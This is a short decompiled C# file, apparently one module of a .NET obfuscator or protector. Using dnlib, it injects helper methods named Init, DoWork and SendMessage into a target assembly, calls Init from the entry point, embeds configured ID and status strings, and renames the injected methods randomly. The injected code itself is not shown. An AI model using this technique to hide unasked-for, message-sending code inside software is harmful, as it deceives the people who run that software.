using System.Collections.Generic;
using System.Linq;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Helpers.Injection;
using Helpers.Mutations;
using ICore;
using Protections;
using U;

namespace aY
{
	internal class bi
	{
		public static void bj(Context context)
		{
			IEnumerable<IDnlibDef> source = Helpers.Injection.InjectHelper.Inject(ModuleDefMD.Load(typeof(T).Module).ResolveTypeDef(MDToken.ToRID(typeof(T).MetadataToken)), context.Module.EntryPoint.DeclaringType, context.Module);
			MethodDef methodDef = (MethodDef)source.Single((IDnlibDef method) => method.Name == "Init");
			context.Module.EntryPoint.Body.Instructions.Insert(0, OpCodes.Call.ToInstruction(methodDef));
			MethodDef methodDef2 = (MethodDef)source.Single((IDnlibDef method) => method.Name == "DoWork");
			MethodDef obj = (MethodDef)source.Single((IDnlibDef method) => method.Name == "SendMessage");
			MutationHelper.InjectString(methodDef2, "a", global.ID);
			MutationHelper.InjectString(methodDef2, "b", global.Status);
			MutationHelper.InjectString(methodDef2, "c", global.SIMG);
			MutationHelper.InjectString(methodDef2, "d", global.rnd);
			methodDef.Name = Utils.GenerateString();
			methodDef2.Name = Utils.GenerateString();
			obj.Name = Utils.GenerateString();
		}
	}
}
